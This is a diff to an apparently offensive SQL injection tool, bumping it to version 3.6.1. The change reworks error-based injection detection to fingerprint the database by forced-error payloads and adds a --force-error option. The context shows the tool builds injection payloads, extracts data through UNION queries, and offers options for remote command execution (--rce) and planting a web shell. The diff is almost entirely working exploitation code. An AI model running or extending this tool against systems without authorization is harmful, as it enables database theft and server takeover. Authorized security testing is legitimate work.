@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.0"
+VERSION = "3.6.1"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -713,20 +713,24 @@ def find_time(target, a, contexts, candidates):
                 return d, ctx
     return None, None
 
-def find_error(target, dbms, a, contexts):
-    """Detect reflected DB errors -> enables one-shot error-based dump."""
-    if not dbms.error_expr(PROBE):
-        return None
-    for ctx in contexts:
-        if ctx.kind != "bool":
+def find_error(target, a, contexts, candidates):
+    """Detect a reflected DB error. Each candidate DBMS's forced-error syntax is tried;
+    the one whose error reflects our PROBE both confirms error-based AND identifies the
+    DBMS - so this runs even when boolean/time found no usable signal."""
+    for d in candidates:
+        if not d.error_expr(PROBE):          # e.g. Oracle: no error primitive
             continue
         probe_inner = f"'{PROBE}'"
-        payload = f"{ctx.close}{ctx.logic}{dbms.error_expr(probe_inner)}{dbms.comment}"
-        tok = dbms.error_value(target.send(payload).text)
-        if tok and dbms.error_finalize(tok) == PROBE:
-            print(f"[+] error reflection on {ctx.name} ({dbms.name})")
-            return ctx
-    return None
+        for ctx in contexts:
+            if ctx.kind != "bool":
+                continue
+            print(f"[*] error probe   : {d.name}/{ctx.name} ...", flush=True)
+            payload = f"{ctx.close}{ctx.logic}{d.error_expr(probe_inner)}{d.comment}"
+            tok = d.error_value(target.send(payload).text)
+            if tok and d.error_finalize(tok) == PROBE:
+                print(f"[+] error reflection on {ctx.name} ({d.name})")
+                return d, ctx
+    return None, None
 
 
 def find_union(target, a, dbms):
@@ -768,42 +772,52 @@ def detect(target, a):
     candidates = [DBMS_BY_NAME[a.dbms]] if a.dbms else DBMS_LIST
 
     bool_ctx, cal = (None, None)
-    if not a.force_time:
+    if not (a.force_time or a.force_error):
         bool_ctx, cal = find_boolean(target, a, contexts)
 
     dbms = candidates[0] if a.dbms else None
+    fp_inconclusive = False
     if bool_ctx and not a.dbms:
         dbms = fingerprint_dbms(target, bool_ctx, cal[0], a, candidates)
         if dbms:
             print(f"[+] DBMS fingerprint: {dbms.name}")
         else:
-            # no silent default: a wrong DBMS means wrong syntax -> false negatives
-            print("[!] DBMS fingerprint inconclusive. Re-run with --dbms "
-                  "<postgresql|mysql|mssql|oracle> to proceed.")
-            return None
+            # boolean signalled but DBMS unclear; an error probe can still pin it, so
+            # don't bail yet - only give up later if nothing identifies the backend.
+            fp_inconclusive = True
 
     # no boolean -> try time (also identifies DBMS)
     time_ctx = None
-    if not bool_ctx and not a.force_boolean:
+    if not bool_ctx and not (a.force_boolean or a.force_error):
         d2, time_ctx = find_time(target, a, contexts, candidates)
         if d2:
             dbms = d2
 
-    if not dbms:
-        return None
-
-    # prefer UNION (reflected, ~1 request/value) when available
-    if not (a.force_boolean or a.force_time) and not a.no_union:
+    # prefer UNION (reflected, ~1 request/value) when the DBMS is already known
+    if dbms and not (a.force_boolean or a.force_time or a.force_error) and not a.no_union:
         u = find_union(target, a, dbms)
         if u:
             return Detection("union-based", dbms, bool_ctx or time_ctx or BOOL_CONTEXTS[0],
                              union=u)
 
-    # then error-based (one-shot) unless forced away
+    # error-based: one-shot AND self-identifying, so it runs even with no boolean/time
+    # signal (the classic visible-error target). Probe the known DBMS, else all candidates.
     if not (a.force_boolean or a.force_time) and not a.no_error:
-        err_ctx = find_error(target, dbms, a, contexts)
-        if err_ctx:
-            return Detection("error-based", dbms, err_ctx, err_ctx=err_ctx)
+        ecands = [dbms] if dbms else candidates
+        ed, err_ctx = find_error(target, a, contexts, ecands)
+        if ed:
+            return Detection("error-based", ed, err_ctx, err_ctx=err_ctx)
+
+    if a.force_error:
+        print("[!] --force-error: no reflected DB error found "
+              "(try --allow-or, --dbms, or a different injection point).")
+        return None
+
+    if not dbms:
+        if fp_inconclusive:
+            print("[!] DBMS fingerprint inconclusive. Re-run with --dbms "
+                  "<postgresql|mysql|mssql|oracle> to proceed.")
+        return None
 
     if bool_ctx:
         oracle = BoolOracle(target, dbms, bool_ctx, a, cal[0], cal[1])
@@ -1175,6 +1189,8 @@ def main():
     det.add_argument("--dbms", choices=list(DBMS_BY_NAME), help="pin the DBMS (skip fingerprinting)")
     det.add_argument("--force-boolean", action="store_true")
     det.add_argument("--force-time", action="store_true")
+    det.add_argument("--force-error", action="store_true",
+                     help="only use error-based; skip boolean/time probing")
     det.add_argument("--no-error", action="store_true", help="don't use error-based even if available")
     det.add_argument("--no-union", action="store_true", help="don't try UNION (reflected) extraction")
     det.add_argument("--union-cols", type=int, default=12, dest="union_cols",
@@ -1214,8 +1230,8 @@ def main():
     a = ap.parse_args()
     if not a.request and not a.url:
         ap.error("provide -u/--url (with -d/-H) or --request")
-    if a.force_boolean and a.force_time:
-        ap.error("--force-boolean and --force-time are mutually exclusive")
+    if sum((a.force_boolean, a.force_time, a.force_error)) > 1:
+        ap.error("--force-boolean / --force-time / --force-error are mutually exclusive")
     actions = sum(x for x in (a.query is not None, a.dump is not None, a.rce is not None, a.webshell))
     if actions > 1:
         ap.error("choose only one of --query / --dump / --rce / --webshell")
